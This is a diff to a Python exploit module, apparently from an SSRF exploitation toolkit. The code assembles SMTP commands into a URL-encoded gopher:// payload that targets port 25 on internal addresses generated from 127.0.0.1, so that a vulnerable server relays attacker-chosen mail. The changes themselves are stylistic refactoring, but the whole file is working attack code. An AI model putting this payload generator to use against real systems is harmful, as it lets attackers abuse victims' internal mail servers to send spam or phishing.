@@ -18,18 +18,19 @@ class exploit():
         self.mailto = input("[MAILTO] Give a mail (e.g: hacker@example.com): ")
 
         gen_host = gen_ip_list("127.0.0.1", args.level)
+        port = 25
         for ip in gen_host:
-            port = 25
             commands = [
-                'MAIL FROM:' + self.mailfrom,
-                'RCPT To:' + self.mailto,
+                f'MAIL FROM:{self.mailfrom}',
+                f'RCPT To:{self.mailto}',
                 'DATA',
-                'From:' + self.mailfrom,
-                'Subject:' + self.subject,
-                'Message:' + self.msg,
+                f'From:{self.mailfrom}',
+                f'Subject:{self.subject}',
+                f'Message:{self.msg}',
                 '.',
-                ''
+                '',
             ]
+
 
             data = "%0A".join(commands)
             data = urllib.quote_plus(data).replace("+","%20")
@@ -37,7 +38,7 @@ class exploit():
             data = data.replace("%25","%")
             data = data.replace("%3A",":")
             payload = wrapper_gopher(data, ip , port)
-            logging.info("Generated payload : {}".format(payload))
+            logging.info(f"Generated payload : {payload}")
 
 
             logging.info("Mail sent, look your inbox !")
